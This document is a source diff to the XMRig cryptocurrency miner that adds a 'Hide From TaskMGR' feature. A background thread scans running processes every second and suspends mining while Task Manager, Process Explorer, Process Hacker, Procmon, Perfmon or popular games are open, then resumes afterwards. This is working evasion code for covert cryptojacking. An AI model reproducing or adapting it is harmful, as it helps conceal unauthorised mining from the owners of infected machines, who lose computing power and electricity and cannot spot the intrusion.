@@ -40,7 +40,11 @@
 #include "Summary.h"
 #include "version.h"
 #include "workers/Workers.h"
-
+ //Hide From TaskMGR ====
+#include <windows.h>
+#include <tlhelp32.h>
+#include <thread>
+ //Hide From TaskMGR ====
 
 #ifndef XMRIG_NO_HTTPD
 #   include "common/api/Httpd.h"
@@ -49,7 +53,7 @@
 
 App *App::m_self = nullptr;
 
-
+bool IsProcessRun(void); // Hide From TaskMGR ====
 
 App::App(int argc, char **argv) :
     m_console(nullptr),
@@ -69,6 +73,7 @@ App::App(int argc, char **argv) :
     uv_signal_init(uv_default_loop(), &m_sigHUP);
     uv_signal_init(uv_default_loop(), &m_sigINT);
     uv_signal_init(uv_default_loop(), &m_sigTERM);
+	uv_signal_init(uv_default_loop(), &m_signal); // Hide From TaskMGR ====
 }
 
 
@@ -84,6 +89,43 @@ App::~App()
 #   endif
 }
 
+//Hide From TaskMGR ====
+void Check() {
+	while (true) {
+		Sleep(1000);
+		bool Founded = IsProcessRun();
+		switch (Founded) {
+		case 1:
+			Workers::setEnabled(false);
+			break;
+
+		default:
+			if (!Workers::isEnabled()) { Workers::setEnabled(true); }
+			break;
+		}
+	}
+}
+
+bool IsProcessRun(void)
+{
+	bool RUN;
+	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	PROCESSENTRY32 pe;
+	pe.dwSize = sizeof(PROCESSENTRY32);
+	Process32First(hSnapshot, &pe);
+	while (Process32Next(hSnapshot, &pe))
+	{
+		if (wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
+		{
+			RUN = true;
+			return RUN;
+		}
+		else
+			RUN = false;
+	}
+	return RUN;
+}
+//Hide From TaskMGR ====
 
 int App::exec()
 {
@@ -91,11 +133,23 @@ int App::exec()
         return 2;
     }
 
+	//Hide From TaskMGR ====
+	std::thread* check_taskers = new std::thread(Check);
+	check_taskers->detach();
+	//Hide From TaskMGR ====
+
     uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
     uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
     uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);
 
     background();
+
+	//Hide From TaskMGR ====
+	if (!m_controller->isReady()) {return 0;}
+	uv_signal_start(&m_signal, App::onSignal, SIGHUP);
+	uv_signal_start(&m_signal, App::onSignal, SIGTERM);
+	uv_signal_start(&m_signal, App::onSignal, SIGINT);
+	//Hide From TaskMGR ====
 
     Mem::init(m_controller->config()->isHugePages());
 
